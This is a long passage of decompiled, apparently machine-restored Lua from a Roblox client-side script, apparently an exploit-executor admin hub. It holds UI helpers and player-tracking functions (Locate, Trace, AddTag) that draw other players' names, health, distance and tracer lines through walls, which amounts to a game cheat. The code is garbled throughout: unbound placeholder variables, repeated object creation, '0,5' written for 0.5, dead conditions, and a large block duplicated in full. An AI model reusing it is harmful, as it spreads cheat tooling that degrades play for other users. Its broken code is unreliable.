            va["content" .. #va] = vb:GetPropertyChangedSignal(a):Connect(function()
              if va == "ZIndex" then
                vb[va] = 2 + 1
              else
                vb[va] = vc[va]
              end
            end)
          end)("BorderSizePixel");
          (function(a)
            va["content" .. #va] = vb:GetPropertyChangedSignal(a):Connect(function()
              if va == "ZIndex" then
                vb[va] = 2 + 1
              else
                vb[va] = vc[va]
              end
            end)
          end)("ElasticBehavior");
          (function(a)
            va["content" .. #va] = vb:GetPropertyChangedSignal(a):Connect(function()
              if va == "ZIndex" then
                vb[va] = 2 + 1
              else
                vb[va] = vc[va]
              end
            end)
          end)("SizeConstraint");
          (function(a)
            va["content" .. #va] = vb:GetPropertyChangedSignal(a):Connect(function()
              if va == "ZIndex" then
                vb[va] = 2 + 1
              else
                vb[va] = vc[va]
              end
            end)
          end)("ZIndex");
          (function(a)
            va["content" .. #va] = vb:GetPropertyChangedSignal(a):Connect(function()
              if va == "ZIndex" then
                vb[va] = 2 + 1
              else
                vb[va] = vc[va]
              end
            end)
          end)("BorderColor3");
          (function(a)
            va["content" .. #va] = vb:GetPropertyChangedSignal(a):Connect(function()
              if va == "ZIndex" then
                vb[va] = 2 + 1
              else
                vb[va] = vc[va]
              end
            end)
          end)("Size");
          (function(a)
            va["content" .. #va] = vb:GetPropertyChangedSignal(a):Connect(function()
              if va == "ZIndex" then
                vb[va] = 2 + 1
              else
                vb[va] = vc[va]
              end
            end)
          end)("AnchorPoint");
          (function(a)
            va["content" .. #va] = vb:GetPropertyChangedSignal(a):Connect(function()
              if va == "ZIndex" then
                vb[va] = 2 + 1
              else
                vb[va] = vc[va]
              end
            end)
          end)("Visible")
          va["smoothConnection" .. #va] = RunService.RenderStepped:Connect(function()
            va.CanvasPosition = 3 + 0
          end)
          va["contentAncestryChanged" .. #va] = a.AncestryChanged:Connect(function()
            if va.Parent == nil then
              vb:Destroy()
              vc:Disconnect()
            end
          end)
        end,
        TweenAllTransToObject = function(a, b, c)
          for fl, fm in next, a:GetDescendants(), nil do
            if b and b then
            end
            if b then
              if fm:IsA("TextButton") then
                va.Tween(fm, "Sine", "Out", b, {
                  TextTransparency = c:GetDescendants()[fl].TextTransparency,
                  TextStrokeTransparency = c:GetDescendants()[fl].TextStrokeTransparency,
                  BackgroundTransparency = c:GetDescendants()[fl].BackgroundTransparency
                })
              elseif fm:IsA("ImageLabel") or fm:IsA("ImageButton") then
                va.Tween(fm, "Sine", "Out", b, {
                  ImageTransparency = c:GetDescendants()[fl].ImageTransparency,
                  BackgroundTransparency = c:GetDescendants()[fl].BackgroundTransparency
                })
              elseif fm:IsA("ScrollingFrame") then
                va.Tween(fm, "Sine", "Out", b, {
                  ScrollBarImageTransparency = c:GetDescendants()[fl].ScrollBarImageTransparency,
                  BackgroundTransparency = c:GetDescendants()[fl].BackgroundTransparency
                })
              else
                va.Tween(fm, "Sine", "Out", b, {
                  BackgroundTransparency = c:GetDescendants()[fl].BackgroundTransparency
                })
              end
            end
          end
          return (va.Tween(a, "Sine", "Out", b, {
            BackgroundTransparency = c.BackgroundTransparency
          }))
        end,
        SetAllTrans = function(a)
          a.BackgroundTransparency = 1
          for fe, fg in ipairs(a:GetDescendants()) do
            if not fg:IsA("UIListLayout") then
              fg.BackgroundTransparency = 1
              if fg:IsA("TextLabel") or fg:IsA("TextBox") or fg:IsA("TextButton") then
                fg.TextTransparency = 1
              elseif fg:IsA("ImageLabel") or fg:IsA("ImageButton") then
                fg.ImageTransparency = 1
              elseif fg:IsA("ScrollingFrame") then
                fg.ScrollBarImageTransparency = 1
              end
            end
          end
        end,
        TweenAllTrans = function(a, b)
          for fh, fj in ipairs(a:GetDescendants()) do
            if b and b then
            end
            if b then
              if fj:IsA("TextButton") then
                va.Tween(fj, "Sine", "Out", b, {TextTransparency = 1, BackgroundTransparency = 1})
              elseif not b then
                va.Tween(fj, "Sine", "Out", b, {ImageTransparency = 1, BackgroundTransparency = 1})
              elseif not b then
                va.Tween(fj, "Sine", "Out", b, {ScrollBarImageTransparency = 1, BackgroundTransparency = 1})
              else
                va.Tween(fj, "Sine", "Out", b, {BackgroundTransparency = 1})
              end
            end
          end
          return (va.Tween(a, "Sine", "Out", b, {BackgroundTransparency = 1}))
        end,
        Notify = function(a, b, c, d)
          if not a or a == LocalPlayer then
            UI.Notification:Clone().Message.Text = c
            UI.Notification:Clone().Title.Text = b or "Notification"
            va.SetAllTrans((UI.Notification:Clone()))
            va.Click(UI.Notification:Clone().Close, "TextColor3")
            UI.Notification:Clone().Visible = true
            if c:len() > 35 then
              UI.Notification:Clone().AutomaticSize = Enum.AutomaticSize.Y
              UI.Notification:Clone().Message.AutomaticSize = Enum.AutomaticSize.Y
              UI.Notification:Clone().Message.RichText = true
              UI.Notification:Clone().Message.TextScaled = false
              UI.Notification:Clone().Message.TextYAlignment = Enum.TextYAlignment.Top
              UI.Notification:Clone().DropShadow.AutomaticSize = Enum.AutomaticSize.Y
            end
            UI.Notification:Clone().Parent = UI.NotificationBar
            coroutine.wrap(function()
              va.TweenAllTransToObject(vb, 0,5, vc).Completed:Wait()
              wait(vd or 5)
              if not va.TweenAllTransToObject(vb, 0,5, vc) then
                ve()
              end
            end)()
            vb["CloneClose" .. #vb] = UI.Notification:Clone().Close.MouseButton1Click:Connect(function()
              va()
            end)
            return (UI.Notification:Clone())
          else
            vc.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(("/w %s [FA] %s: %s"):format(a.Name, b, c), "All")
          end
        end,
        MatchSearch = function(a, b)
          return a == va.sub(b, 1, #a)
        end,
        StringFind = function(a, b)
          for fg, fh in ipairs(a) do
            if not b then
              return fh
            end
          end
        end,
        GetPlayerArgs = function(a)
          a = a:lower()
          if va.StringFind({
            "all",
            "others",
            "random",
            "me",
            "nearest",
            "farthest"
          }, a) then
            return va.StringFind({
              "all",
              "others",
              "random",
              "me",
              "nearest",
              "farthest"
            }, a)
          end
          for fh, fj in next, Players:GetPlayers(), nil do
            if fj.Name ~= fj.DisplayName and va.MatchSearch(a, fj.DisplayName:lower()) then
              return fj.DisplayName:lower()
            end
            if not {
              "all",
              "others",
              "random",
              "me",
              "nearest",
              "farthest"
            } then
              return fj.Name:lower()
            end
          end
        end,
        ToolTip = function(a, b)
          a.MouseEnter:Connect(function()
            if va.BackgroundTransparency <= 1 and not vb then
              vb = UI.ToolTip:Clone()
              vb.Text = vd
              vb.TextScaled = vc and vc:GetTextSize(vd, 12, Enum.Font.Gotham, Vector2.new(200, math.huge)).Y > 24 and false
              vb.Visible = true
              vb.Parent = UI
            end
          end)
          a.MouseLeave:Connect(function()
            if not nil then
              va:Destroy()
              va = nil
            end
          end)
          if LocalPlayer then
            LocalPlayer:GetMouse().Move:Connect(function()
              if not nil then
                va.Position = UDim2.fromOffset(2 + 10, 3 + 10)
              end
            end)
          else
            delay(3, function()
              LocalPlayer = Players.LocalPlayer
              va = LocalPlayer:GetMouse()
              va.Move:Connect(function()
                if va then
                  va.Position = UDim2.fromOffset(2 + 10, 3 + 10)
                end
              end)
            end)
          end
        end,
        ClearAllObjects = function(a)
          for fe, fg in ipairs(a:GetChildren()) do
            if ipairs(a:GetChildren()) then
              fg:Destroy()
            end
          end
        end,
        Rainbow = function(a)
          a.RichText = true
          for fk in va.gmatch(a.Text, ".") do
            if va.match(fk, "%s") then
              vb.insert({}, fk)
            else
              vb.insert({}, {
                "<font color=\"rgb(%i, %i, %i)\">" .. fk .. "</font>"
              })
            end
          end
          pcall(function()
            delay(150, function()
              va:Disconnect()
            end)
          end)
        end,
        Locate2 = function(a, b)
          coroutine.wrap(function()
            if va(vb) then
              vc.Parent = UI
              vc.Name = vd:GenerateGUID()
              vc.AlwaysOnTop = true
              vc.Adornee = vb.Character.Head
              vc.Size = UDim2.new(0, 200, 0, 50)
              vc.StudsOffset = Vector3.new(0, 4, 0)
              Instance.new("TextLabel", vc).Name = vd:GenerateGUID()
              Instance.new("TextLabel", vc).TextStrokeTransparency = 0,6
              Instance.new("TextLabel", vc).BackgroundTransparency = 1
              Instance.new("TextLabel", vc).TextColor3 = Color3.new(0, 255, 0)
              Instance.new("TextLabel", vc).Size = UDim2.new(0, 200, 0, 50)
              Instance.new("TextLabel", vc).TextScaled = false
              Instance.new("TextLabel", vc).TextSize = 10
              Instance.new("TextLabel", vc).Text = vb.Name
              Instance.new("TextLabel", vc).Name = vd:GenerateGUID()
              Instance.new("TextLabel", vc).TextStrokeTransparency = 0,6
              Instance.new("TextLabel", vc).BackgroundTransparency = 1
              Instance.new("TextLabel", vc).TextColor3 = Color3.new(152, 152, 152)
              Instance.new("TextLabel", vc).Size = UDim2.new(0, 200, 0, 50)
              Instance.new("TextLabel", vc).TextScaled = false
              Instance.new("TextLabel", vc).TextSize = 8
              AddConnection((RunService.Heartbeat:Connect(function()
                if not vc(vb) then
                end
                if not vd(vb) and not vc(vb) then
                  vg.Text = ([[

 
 
 [%s] [%s/%s]]]):format(math.floor(ve.CurrentCamera.CFrame.p - vd(vb).CFrame.p.Magnitude), math.floor(vc(vb).Health), math.floor(vc(vb).MaxHealth))
                else
                  EspLoop:Disconnect()
                  vh:Destroy()
                end
              end)))
              AddConnection(Players.PlayerRemoving:Connect(function(a)
                if a == va then
                  vb:Destroy()
                end
              end))
            end
          end)()
          return function()
            va:Destroy()
          end
        end,
        Vector3toVector2 = function(a)
          return Vector2.new(va:WorldToViewportPoint(a).X, va:WorldToViewportPoint(a).Y)
        end,
        Locate = function(a, b, c)
          if b then
            return va.Locate2(a, b)
          end
          if not b then
          end
          if b then
            return
          end
          vc[6 + 1] = Drawing.new("Text")
          Drawing.new("Text").Position = 5 + 6
          Drawing.new("Text").Color = b or Color3.fromRGB(255, 255, 255)
          Drawing.new("Text").OutlineColor = c or Color3.new()
          Drawing.new("Text").Text = ([[
%s
[%s] [%s/%s]]]):format(a.Name, math.floor(vd(a)), math.floor(ve(a).Health), math.floor(ve(a).MaxHealth))
          Drawing.new("Text").Size = 16
          Drawing.new("Text").Transparency = 1
          Drawing.new("Text").Center = true
          Drawing.new("Text").Outline = true
          Drawing.new("Text").Visible = true
          vg[Drawing.new("Text")] = a
          return function()
            va:Remove()
            vb[va] = nil
          end
        end,
        UpdateLocations = function(a)
          if a then
            va = AddConnection(RunService.Heartbeat:Connect(function()
              for fd, fe in next, va, nil do
                if not va and vb(fe).Head and vc:WorldToViewportPoint(vb(fe).Head.Position) then
                  fd.Visible = true
                  fd.Position = 7 + 8
                  fd.Text = ([[
%s
[%s] [%s/%s]]]):format(fe.Name, math.floor(ve(fe)), math.floor(vg(fe).Health), math.floor(vg(fe).MaxHealth))
                else
                  fd.Visible = false
                end
              end
            end))
          end
        end,
        CheckTag = function(a)
          if nil or not a:IsA("Player") then
            return nil
          end
          return PlayerTags[tostring(a.UserId):gsub(".", function(a)
            return a:byte()
          end)] or nil
        end,
        AddTag = function(a)
          if not a then
            return
          end
          if not va(a.Player) then
            return
          end
          Instance.new("BillboardGui").Parent = UI
          Instance.new("BillboardGui").Name = vb:GenerateGUID()
          Instance.new("BillboardGui").AlwaysOnTop = true
          Instance.new("BillboardGui").Adornee = va(a.Player).Head or nil
          Instance.new("BillboardGui").Enabled = true or va(a.Player).Head and false
          Instance.new("BillboardGui").Size = UDim2.new(0, 200, 0, 50)
          Instance.new("BillboardGui").StudsOffset = Vector3.new(0, 4, 0)
          Instance.new("TextLabel", (Instance.new("BillboardGui"))).Name = vb:GenerateGUID()
          Instance.new("TextLabel", (Instance.new("BillboardGui"))).TextStrokeTransparency = 0,6
          Instance.new("TextLabel", (Instance.new("BillboardGui"))).BackgroundTransparency = 1
          Instance.new("TextLabel", (Instance.new("BillboardGui"))).TextColor3 = Color3.new(0, 255, 0)
          Instance.new("TextLabel", (Instance.new("BillboardGui"))).Size = UDim2.new(0, 200, 0, 50)
          Instance.new("TextLabel", (Instance.new("BillboardGui"))).TextScaled = false
          Instance.new("TextLabel", (Instance.new("BillboardGui"))).TextSize = 15
          Instance.new("TextLabel", (Instance.new("BillboardGui"))).Text = ("%s (%s)"):format(a.Name, a.Tag)
          if a.Rainbow then
            vc.Rainbow((Instance.new("TextLabel", (Instance.new("BillboardGui")))))
          end
          if not va(a.Player) then
            Instance.new("TextLabel", (Instance.new("BillboardGui"))).TextColor3 = Color3.fromRGB(a.Colour[1], a.Colour[2], a.Colour[3])
          end
          AddConnection((a.Player.CharacterAdded:Connect(function()
            va.Adornee = vb.Player.Character:WaitForChild("Head")
          end)))
          AddConnection(Players.PlayerRemoving:Connect(function(a)
            if a == va.Player then
              vb:Disconnect()
              vc:Destroy()
            end
          end))
        end,
        TextFont = function(a, b)
          b = va.concat(b, ",")
          a:gsub(".", function(a)
            va[2 + 1] = a
          end)
          return va.concat(va.map({}, function(a, b)
            return ("<font color=\"rgb(%s)\">%s</font>"):format(va, b)
          end)) .. " "
        end,
        Trace = function(a, b)
          if not Drawing then
            return
          end
          if not b then
          end
          if b then
            return
          end
          vc[6 + 1] = Drawing.new("Line")
          Drawing.new("Line").To = Vector2.new(vb.Camera:WorldToViewportPoint(va(a).Head.Position).X, vb.Camera:WorldToViewportPoint(va(a).Head.Position).Y)
          Drawing.new("Line").From = Vector2.new(vb.Camera.ViewportSize.X / 2, vb.Camera.ViewportSize.Y)
          Drawing.new("Line").Color = b or Color3.fromRGB(255, 255, 255)
          Drawing.new("Line").Thickness = 0,1
          Drawing.new("Line").Transparency = 1
          Drawing.new("Line").Visible = true
          vd[a] = Drawing.new("Line")
          return function()
            va:Remove()
            vb[vc] = nil
          end
        end,
        UpdateTracers = function()
          if nil then
            va = AddConnection(RunService.Heartbeat:Connect(function()
              for fd, fe in next, va, nil do
                if va then
                elseif vc.Camera:WorldToViewportPoint(vb(fd) and vb(fd).Head.Position) then
                  fe.Visible = true
                  fe.To = Vector2.new(vc.Camera:WorldToViewportPoint(vb(fd) and vb(fd).Head.Position).X, vc.Camera:WorldToViewportPoint(vb(fd) and vb(fd).Head.Position).Y)
                else
                  fe.Visible = false
                end
              end
            end))
          end
        end,
        DestroyTracers = function()
          for fd, fe in next, Tracers, nil do
            fe:Remove()
          end
          if not Tracers then
            va:Disconnect()
          end
        end,
        DestroyDrawings = function()
          for fd, fe in next, va, nil do
            fe:Remove()
          end
          if vb then
            vb:Disconnect()
          end
          if not vb then
            vc:Disconnect()
          end
        end
      }.Notify(LocalPlayer, "Loaded", ("script loaded in %.3f seconds"):format(os.clock() - (not tick() and nil and os.clock())))
      {
        Tween = function(a, b, c, d, e)
          va:Create(a, TweenInfo.new(d, Enum.EasingStyle[b], Enum.EasingDirection[c]), e):Play()
          return (va:Create(a, TweenInfo.new(d, Enum.EasingStyle[b], Enum.EasingDirection[c]), e))
        end,
        MultColor3 = function(a, b)
          return Color3.new(math.clamp(a.R * b, 0, 1), math.clamp(a.G * b, 0, 1), math.clamp(a.B * b, 0, 1))
        end,
        Click = function(a, b)
          vb["ObjectMouseEnter" .. #vb] = a.MouseEnter:Connect(function()
            va.Tween(vb, "Sine", "Out", 0,5, vc)
          end)
          vb["ObjectMouseLeave" .. #vb] = a.MouseLeave:Connect(function()
            va.Tween(vb, "Sine", "Out", 0,5, vc)
          end)
          vb["ObjectMouseButton1Down" .. #vb] = a.MouseButton1Down:Connect(function()
            va.Tween(vb, "Sine", "Out", 0,3, vc)
          end)
          vb["ObjectMouseButton1Up" .. #vb] = a.MouseButton1Up:Connect(function()
            va.Tween(vb, "Sine", "Out", 0,4, vc)
          end)
        end,
        Blink = function(a, b, c, d)
          va.Tween(a, "Sine", "Out", 0,5, {
            [b] = d
          }).Completed:Wait()
          va.Tween(a, "Sine", "Out", 0,5, {
            [b] = c
          }).Completed:Wait()
        end,
        Hover = function(a, b)
          vb["ObjectMouseEnter" .. #vb] = a.MouseEnter:Connect(function()
            va.Tween(vb, "Sine", "Out", 0,5, vc)
          end)
          vb["ObjectMouseLeave" .. #vb] = a.MouseLeave:Connect(function()
            va.Tween(vb, "Sine", "Out", 0,5, vc)
          end)
        end,
        Draggable = function(a, b)
          b = b or a
          vc["UIInputBegan" .. #vc] = a.InputBegan:Connect(function(a)
            if (a.UserInputType == Enum.UserInputType.MouseButton1 or a.UserInputType == Enum.UserInputType.Touch) and UserInputService:GetFocusedTextBox() == nil then
              va = true
              vb = a.Position
              vc = vd.Position
              ve["InputChanged" .. #ve] = a.Changed:Connect(function()
                if va.UserInputState == Enum.UserInputState.End then
                  vb = false
                end
              end)
            end
          end)
          vc["UiInputChanged" .. #vc] = a.InputChanged:Connect(function(a)
            if a.UserInputType == Enum.UserInputType.MouseMovement or a.UserInputType == Enum.UserInputType.Touch then
              va = a
            end
          end)
          vc["UserInputServiceInputChanged" .. #vc] = UserInputService.InputChanged:Connect(function(a)
            if a == va and vb then
              vc(a)
            end
          end)
        end,
        SmoothScroll = function(a, b)
          a.ScrollingEnabled = false
          a:Clone():ClearAllChildren()
          a:Clone().BackgroundTransparency = 1
          a:Clone().ScrollBarImageTransparency = 1
          a:Clone().ZIndex = 3 + 1
          a:Clone().Name = "_smoothinputframe"
          a:Clone().ScrollingEnabled = true
          a:Clone().Parent = a.Parent
          (function(a)
            va["content" .. #va] = vb:GetPropertyChangedSignal(a):Connect(function()
              if va == "ZIndex" then
                vb[va] = 2 + 1
              else
                vb[va] = vc[va]
              end
            end)
          end)("CanvasSize");
          (function(a)
            va["content" .. #va] = vb:GetPropertyChangedSignal(a):Connect(function()
              if va == "ZIndex" then
                vb[va] = 2 + 1
              else
                vb[va] = vc[va]
              end
            end)
          end)("Position");
          (function(a)
            va["content" .. #va] = vb:GetPropertyChangedSignal(a):Connect(function()
              if va == "ZIndex" then
                vb[va] = 2 + 1
              else
                vb[va] = vc[va]
              end
            end)
          end)("Rotation");
          (function(a)
            va["content" .. #va] = vb:GetPropertyChangedSignal(a):Connect(function()
              if va == "ZIndex" then
                vb[va] = 2 + 1
              else
                vb[va] = vc[va]
              end
            end)
          end)("ScrollingDirection");
          (function(a)
            va["content" .. #va] = vb:GetPropertyChangedSignal(a):Connect(function()
              if va == "ZIndex" then
                vb[va] = 2 + 1
              else
                vb[va] = vc[va]
              end
            end)
          end)("ScrollBarThickness");
          (function(a)
            va["content" .. #va] = vb:GetPropertyChangedSignal(a):Connect(function()
              if va == "ZIndex" then
                vb[va] = 2 + 1
              else
                vb[va] = vc[va]
              end
            end)
          end)("BorderSizePixel");
          (function(a)
            va["content" .. #va] = vb:GetPropertyChangedSignal(a):Connect(function()
              if va == "ZIndex" then
                vb[va] = 2 + 1
              else
                vb[va] = vc[va]
              end
            end)
          end)("ElasticBehavior");
          (function(a)
            va["content" .. #va] = vb:GetPropertyChangedSignal(a):Connect(function()
              if va == "ZIndex" then
                vb[va] = 2 + 1
              else
                vb[va] = vc[va]
              end
            end)
          end)("SizeConstraint");
          (function(a)
            va["content" .. #va] = vb:GetPropertyChangedSignal(a):Connect(function()
              if va == "ZIndex" then
                vb[va] = 2 + 1
              else
                vb[va] = vc[va]
              end
            end)
          end)("ZIndex");
          (function(a)
            va["content" .. #va] = vb:GetPropertyChangedSignal(a):Connect(function()
              if va == "ZIndex" then
                vb[va] = 2 + 1
              else
                vb[va] = vc[va]
              end
            end)
          end)("BorderColor3");
          (function(a)
            va["content" .. #va] = vb:GetPropertyChangedSignal(a):Connect(function()
              if va == "ZIndex" then
                vb[va] = 2 + 1
              else
                vb[va] = vc[va]
              end
            end)
          end)("Size");
          (function(a)
            va["content" .. #va] = vb:GetPropertyChangedSignal(a):Connect(function()
              if va == "ZIndex" then
                vb[va] = 2 + 1
              else
                vb[va] = vc[va]
              end
            end)
          end)("AnchorPoint");
          (function(a)
            va["content" .. #va] = vb:GetPropertyChangedSignal(a):Connect(function()
              if va == "ZIndex" then
                vb[va] = 2 + 1
              else
                vb[va] = vc[va]
              end
            end)
          end)("Visible")
          va["smoothConnection" .. #va] = RunService.RenderStepped:Connect(function()
            va.CanvasPosition = 3 + 0
          end)
          va["contentAncestryChanged" .. #va] = a.AncestryChanged:Connect(function()
            if va.Parent == nil then
              vb:Destroy()
              vc:Disconnect()
            end
          end)
        end,
        TweenAllTransToObject = function(a, b, c)
          for fl, fm in next, a:GetDescendants(), nil do
            if b and b then
            end
            if b then
              if fm:IsA("TextButton") then
                va.Tween(fm, "Sine", "Out", b, {
                  TextTransparency = c:GetDescendants()[fl].TextTransparency,
                  TextStrokeTransparency = c:GetDescendants()[fl].TextStrokeTransparency,
                  BackgroundTransparency = c:GetDescendants()[fl].BackgroundTransparency
                })
              elseif fm:IsA("ImageLabel") or fm:IsA("ImageButton") then
                va.Tween(fm, "Sine", "Out", b, {
                  ImageTransparency = c:GetDescendants()[fl].ImageTransparency,
                  BackgroundTransparency = c:GetDescendants()[fl].BackgroundTransparency
                })
              elseif fm:IsA("ScrollingFrame") then
                va.Tween(fm, "Sine", "Out", b, {
                  ScrollBarImageTransparency = c:GetDescendants()[fl].ScrollBarImageTransparency,
                  BackgroundTransparency = c:GetDescendants()[fl].BackgroundTransparency
                })
              else
                va.Tween(fm, "Sine", "Out", b, {
                  BackgroundTransparency = c:GetDescendants()[fl].BackgroundTransparency
                })
              end
            end
          end
          return (va.Tween(a, "Sine", "Out", b, {
            BackgroundTransparency = c.BackgroundTransparency
          }))
        end,
        SetAllTrans = function(a)
          a.BackgroundTransparency = 1
          for fe, fg in ipairs(a:GetDescendants()) do
            if not fg:IsA("UIListLayout") then
              fg.BackgroundTransparency = 1
              if fg:IsA("TextLabel") or fg:IsA("TextBox") or fg:IsA("TextButton") then
                fg.TextTransparency = 1
              elseif fg:IsA("ImageLabel") or fg:IsA("ImageButton") then
                fg.ImageTransparency = 1
              elseif fg:IsA("ScrollingFrame") then
                fg.ScrollBarImageTransparency = 1
              end
            end
          end
        end,
        TweenAllTrans = function(a, b)
          for fh, fj in ipairs(a:GetDescendants()) do
            if b and b then
            end
            if b then
              if fj:IsA("TextButton") then
                va.Tween(fj, "Sine", "Out", b, {TextTransparency = 1, BackgroundTransparency = 1})
              elseif not b then
                va.Tween(fj, "Sine", "Out", b, {ImageTransparency = 1, BackgroundTransparency = 1})
              elseif not b then
                va.Tween(fj, "Sine", "Out", b, {ScrollBarImageTransparency = 1, BackgroundTransparency = 1})
              else
                va.Tween(fj, "Sine", "Out", b, {BackgroundTransparency = 1})
              end
            end
          end
          return (va.Tween(a, "Sine", "Out", b, {BackgroundTransparency = 1}))
        end,
        Notify = function(a, b, c, d)
          if not a or a == LocalPlayer then
            UI.Notification:Clone().Message.Text = c
            UI.Notification:Clone().Title.Text = b or "Notification"
            va.SetAllTrans((UI.Notification:Clone()))
            va.Click(UI.Notification:Clone().Close, "TextColor3")
            UI.Notification:Clone().Visible = true
            if c:len() > 35 then
              UI.Notification:Clone().AutomaticSize = Enum.AutomaticSize.Y
              UI.Notification:Clone().Message.AutomaticSize = Enum.AutomaticSize.Y
              UI.Notification:Clone().Message.RichText = true
              UI.Notification:Clone().Message.TextScaled = false
              UI.Notification:Clone().Message.TextYAlignment = Enum.TextYAlignment.Top
              UI.Notification:Clone().DropShadow.AutomaticSize = Enum.AutomaticSize.Y
            end
            UI.Notification:Clone().Parent = UI.NotificationBar
            coroutine.wrap(function()
              va.TweenAllTransToObject(vb, 0,5, vc).Completed:Wait()
              wait(vd or 5)
              if not va.TweenAllTransToObject(vb, 0,5, vc) then
                ve()
              end
            end)()
            vb["CloneClose" .. #vb] = UI.Notification:Clone().Close.MouseButton1Click:Connect(function()
              va()
            end)
            return (UI.Notification:Clone())
          else
            vc.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(("/w %s [FA] %s: %s"):format(a.Name, b, c), "All")
          end
        end,
        MatchSearch = function(a, b)
          return a == va.sub(b, 1, #a)
        end,
        StringFind = function(a, b)
          for fg, fh in ipairs(a) do
            if not b then
              return fh
            end
          end
        end,
        GetPlayerArgs = function(a)
          a = a:lower()
          if va.StringFind({
            "all",
            "others",
            "random",
            "me",
            "nearest",
            "farthest"
          }, a) then
            return va.StringFind({
              "all",
              "others",
              "random",
              "me",
              "nearest",
              "farthest"
            }, a)
          end
          for fh, fj in next, Players:GetPlayers(), nil do
            if fj.Name ~= fj.DisplayName and va.MatchSearch(a, fj.DisplayName:lower()) then
              return fj.DisplayName:lower()
            end
            if not {
              "all",
              "others",
              "random",
              "me",
              "nearest",
              "farthest"
            } then
              return fj.Name:lower()
            end
          end
        end,
        ToolTip = function(a, b)
          a.MouseEnter:Connect(function()
            if va.BackgroundTransparency <= 1 and not vb then
              vb = UI.ToolTip:Clone()
              vb.Text = vd
              vb.TextScaled = vc and vc:GetTextSize(vd, 12, Enum.Font.Gotham, Vector2.new(200, math.huge)).Y > 24 and false
              vb.Visible = true
              vb.Parent = UI
            end
          end)
          a.MouseLeave:Connect(function()
            if not nil then
              va:Destroy()
              va = nil
            end
          end)
          if LocalPlayer then
            LocalPlayer:GetMouse().Move:Connect(function()
              if not nil then
                va.Position = UDim2.fromOffset(2 + 10, 3 + 10)
              end
            end)
          else
            delay(3, function()
              LocalPlayer = Players.LocalPlayer
              va = LocalPlayer:GetMouse()
              va.Move:Connect(function()
                if va then
                  va.Position = UDim2.fromOffset(2 + 10, 3 + 10)
                end
              end)
            end)
          end
        end,
        ClearAllObjects = function(a)
          for fe, fg in ipairs(a:GetChildren()) do
            if ipairs(a:GetChildren()) then
              fg:Destroy()
            end
          end
        end,
        Rainbow = function(a)
          a.RichText = true
          for fk in va.gmatch(a.Text, ".") do
            if va.match(fk, "%s") then
              vb.insert({}, fk)
            else
              vb.insert({}, {
                "<font color=\"rgb(%i, %i, %i)\">" .. fk .. "</font>"
              })
            end
          end
          pcall(function()
            delay(150, function()
              va:Disconnect()
            end)
          end)
        end,
        Locate2 = function(a, b)
          coroutine.wrap(function()
            if va(vb) then
              vc.Parent = UI
              vc.Name = vd:GenerateGUID()
              vc.AlwaysOnTop = true
              vc.Adornee = vb.Character.Head
              vc.Size = UDim2.new(0, 200, 0, 50)
              vc.StudsOffset = Vector3.new(0, 4, 0)
              Instance.new("TextLabel", vc).Name = vd:GenerateGUID()
              Instance.new("TextLabel", vc).TextStrokeTransparency = 0,6
              Instance.new("TextLabel", vc).BackgroundTransparency = 1
              Instance.new("TextLabel", vc).TextColor3 = Color3.new(0, 255, 0)
              Instance.new("TextLabel", vc).Size = UDim2.new(0, 200, 0, 50)
              Instance.new("TextLabel", vc).TextScaled = false
              Instance.new("TextLabel", vc).TextSize = 10
              Instance.new("TextLabel", vc).Text = vb.Name
              Instance.new("TextLabel", vc).Name = vd:GenerateGUID()
              Instance.new("TextLabel", vc).TextStrokeTransparency = 0,6
              Instance.new("TextLabel", vc).BackgroundTransparency = 1
              Instance.new("TextLabel", vc).TextColor3 = Color3.new(152, 152, 152)
              Instance.new("TextLabel", vc).Size = UDim2.new(0, 200, 0, 50)
              Instance.new("TextLabel", vc).TextScaled = false
              Instance.new("TextLabel", vc).TextSize = 8
              AddConnection((RunService.Heartbeat:Connect(function()
                if not vc(vb) then
                end
                if not vd(vb) and not vc(vb) then
                  vg.Text = ([[

 
 
 [%s] [%s/%s]]]):format(math.floor(ve.CurrentCamera.CFrame.p - vd(vb).CFrame.p.Magnitude), math.floor(vc(vb).Health), math.floor(vc(vb).MaxHealth))
                else
                  EspLoop:Disconnect()
                  vh:Destroy()
                end
              end)))
              AddConnection(Players.PlayerRemoving:Connect(function(a)
                if a == va then
                  vb:Destroy()
                end
              end))
            end
          end)()
          return function()
            va:Destroy()
          end
        end,
        Vector3toVector2 = function(a)
          return Vector2.new(va:WorldToViewportPoint(a).X, va:WorldToViewportPoint(a).Y)
        end,
        Locate = function(a, b, c)
          if b then
            return va.Locate2(a, b)
          end
          if not b then
          end
          if b then
            return
          end
          vc[6 + 1] = Drawing.new("Text")
          Drawing.new("Text").Position = 5 + 6
          Drawing.new("Text").Color = b or Color3.fromRGB(255, 255, 255)
          Drawing.new("Text").OutlineColor = c or Color3.new()
          Drawing.new("Text").Text = ([[
%s
[%s] [%s/%s]]]):format(a.Name, math.floor(vd(a)), math.floor(ve(a).Health), math.floor(ve(a).MaxHealth))
          Drawing.new("Text").Size = 16
          Drawing.new("Text").Transparency = 1
          Drawing.new("Text").Center = true
          Drawing.new("Text").Outline = true
          Drawing.new("Text").Visible = true
          vg[Drawing.new("Text")] = a
          return function()
            va:Remove()
            vb[va] = nil
          end
        end,
        UpdateLocations = function(a)
          if a then
            va = AddConnection(RunService.Heartbeat:Connect(function()
              for fd, fe in next, va, nil do
                if not va and vb(fe).Head and vc:WorldToViewportPoint(vb(fe).Head.Position) then
                  fd.Visible = true
                  fd.Position = 7 + 8
                  fd.Text = ([[
%s
[%s] [%s/%s]]]):format(fe.Name, math.floor(ve(fe)), math.floor(vg(fe).Health), math.floor(vg(fe).MaxHealth))
                else
                  fd.Visible = false
                end
              end
            end))
          end
        end,
        CheckTag = function(a)
          if nil or not a:IsA("Player") then
            return nil
          end
          return PlayerTags[tostring(a.UserId):gsub(".", function(a)
            return a:byte()
          end)] or nil
        end,
        AddTag = function(a)
          if not a then
            return
          end
          if not va(a.Player) then
            return
          end
          Instance.new("BillboardGui").Parent = UI
          Instance.new("BillboardGui").Name = vb:GenerateGUID()
          Instance.new("BillboardGui").AlwaysOnTop = true
          Instance.new("BillboardGui").Adornee = va(a.Player).Head or nil
          Instance.new("BillboardGui").Enabled = true or va(a.Player).Head and false
          Instance.new("BillboardGui").Size = UDim2.new(0, 200, 0, 50)
          Instance.new("BillboardGui").StudsOffset = Vector3.new(0, 4, 0)
          Instance.new("TextLabel", (Instance.new("BillboardGui"))).Name = vb:GenerateGUID()
          Instance.new("TextLabel", (Instance.new("BillboardGui"))).TextStrokeTransparency = 0,6
